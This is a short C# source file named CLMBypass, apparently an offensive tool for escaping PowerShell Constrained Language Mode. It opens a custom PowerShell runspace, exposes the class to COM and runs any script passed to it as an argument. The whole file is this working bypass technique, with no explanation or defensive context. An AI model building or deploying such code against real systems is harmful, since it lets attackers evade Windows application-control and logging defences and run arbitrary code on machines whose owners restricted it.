using System;
using System.Runtime.InteropServices;
using System.Collections.Generic;
using System.Linq;
using System.Text;


namespace CLMBypass
{
    [ComVisible(true)]
    public class CLMBypass
    {
        public void Main(string[] args)
        {
            System.Management.Automation.Runspaces.Runspace run = System.Management.Automation.Runspaces.RunspaceFactory.CreateRunspace();
            run.Open();

            System.Management.Automation.PowerShell shell = System.Management.Automation.PowerShell.Create();
            shell.Runspace = run;

            String exec = args[0];
            shell.AddScript(exec);
            shell.Invoke();

            run.Close();
        }
    }
}
